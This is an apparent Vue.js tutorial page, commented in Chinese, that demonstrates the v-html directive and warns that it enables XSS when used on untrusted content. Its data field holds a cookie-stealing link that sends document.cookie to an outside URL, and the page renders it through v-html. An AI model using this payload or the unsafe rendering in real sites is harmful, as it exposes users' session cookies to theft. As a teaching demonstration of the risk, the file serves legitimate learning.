<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 
        v-html: 可以解析标签, 支持结构的解析

        v-html指令: 
            1. 作用: 向指定节点中渲染包括html结构的内容
            2. 与插值语法的区别:
                (1). v-html会替换节点中所有的内容, {{xxx}}则不会
                (2). v-html可以识别html结构
            3. 严重注意: v-html有安全性问题
                (1). 在网站上动态渲染任意HTML是非常危险的, 容易导致XSS攻击. XSS- 冒充用户之手
                (2). 一定要在可信的内容上使用v-html, 永不要在用户提交内容上

    -->

    <div id="root">
        <div>{{name}}</div>

        <div v-html="name"></div>
        <div v-html="str"></div>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data:{
            name: '惠州',
            msg:'<h1>水量<h1/>',
            str:'<a href=Javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你了<a/>'
        }
    })
</script>
</html>
